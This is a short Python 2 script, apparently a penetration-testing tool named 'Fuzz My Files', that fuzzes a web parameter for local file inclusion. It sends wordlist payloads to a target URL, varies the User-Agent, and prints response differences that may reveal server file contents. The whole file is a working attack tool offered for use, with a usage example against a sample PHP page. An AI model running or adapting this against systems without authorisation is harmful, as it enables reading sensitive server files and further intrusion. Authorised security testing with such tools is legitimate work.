# -*- coding: utf-8 -*-
import sys
import random
import requests
from bs4 import BeautifulSoup

def banner():
	print '''\n\033[1;31;40m     _,---.         ___      _,---.  
  .-`.' ,  \ .-._ .'=.'\  .-`.' ,  \ 
 /==/_  _.-'/==/ \|==|  |/==/_  _.-' 
/==/-  '..-.|==|,|  / - /==/-  '..-. 
|==|_ ,    /|==|  \/  , |==|_ ,    / 
|==|   .--' |==|- ,   _ |==|   .--'  
|==|-  |    |==| _ /\   |==|-  |     
/==/   \    /==/  / / , /==/   \     
`--`---'    `--`./  `--``--`---'     
          \033[1;34;40mF\033[1;31;40muzz \033[1;34;40mM\033[1;31;40my \033[1;34;40mF\033[1;31;40miles         \033[1;33;40mBy MrR3boot\033[1;32;40m \n'''

def lfi(url,payload,length,cookies,response):
	url = url+payload
	int = random.randint(0,10000000)
	r = requests.get(url,headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101{} Firefox/60.0'.format(int)})
	if r.headers['Content-Length']!=length:
		maxlen=len(r.text) if len(response)<len(r.text) else len(response)
		result=''
		for i in range(maxlen):
			letter1=response[i:i+1]
			letter2=r.text[i:i+1]
			if letter1!=letter2:
				result+=letter2
		print '\n\033[1;33;40m[+] Found something with {}\n'.format(url)
		print result.strip()+'\n'
	else:
		print '\033[1;37;40m[-] Trying \033[1;36;40m{} \033[1;37;40m: \033[1;37;40mContent-Length \033[1;36;40m{}'.format(url,r.headers['Content-Length'])

if __name__=="__main__":
	if(len(sys.argv)<3):
		banner()
		print '\033[1;37;40m\nUsage: python fmf.py uri cookies wordlist\n\nEx: python fmf.py http://abc.com/def.php?page= "PHPSESSID=c5pi9t1ckejsd0ugv7vu9pv94q" fuzzdb-win.txt\n' 

	else:
		banner()
		content = open(sys.argv[3]).readlines()
		print '\033[1;37;40m[-] Checking if URL is stable'
		cookies = sys.argv[2].split('=')
		cookies = {cookies[0]:cookies[1]}
		try:
			r = requests.get(sys.argv[1],cookies=cookies)
			print '[+] URL is \033[1;32;40mOnline\033[1;37;40m'
			for line in content:
				lfi(sys.argv[1],line.strip(),r.headers['Content-Length'],cookies,r.text)
		except:
			print '[-] URL is \033[1;31;40mOffline'
